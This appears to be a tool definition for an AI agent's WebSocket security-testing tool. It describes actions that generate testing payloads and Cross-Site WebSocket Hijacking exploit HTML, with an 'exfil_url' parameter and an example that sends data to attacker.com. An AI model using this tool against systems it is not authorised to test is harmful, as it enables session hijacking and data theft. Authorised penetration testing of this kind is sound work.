tool.name: websocket_client
tool.details: Common Use Cases: - Analyze WebSocket URL and provide testing guidance - Generate WebSocket testing payloads - Generate origin testing guidance - Generate Cross-Site WebSocket Hijacking (CSWSH) exploit HTML

parameter.name: action
parameter.description: The WebSocket action: - connect_info: Analyze WebSocket URL and provide testing guidance - generate_payloads: Generate WebSocket testing payloads - test_origin: Generate origin testing guidance - generate_exploit: Generate CSWSH exploit HTML

parameter.name: ws_url
parameter.description: WebSocket URL to test (wss:// or ws://). Required for connect_info, generate_exploit.

parameter.name: exfil_url
parameter.description: URL for data exfiltration. Required for generate_exploit.

returns.description: Testing payloads, exploit code, or analysis results

tool.examples:
# Analyze WebSocket URL
connect_info wss://example.com/ws
# Generate payloads
generate_payloads
# Test origin validation
test_origin target.com
# Generate CSWSH exploit
generate_exploit wss://target.com/ws https://attacker.com/log
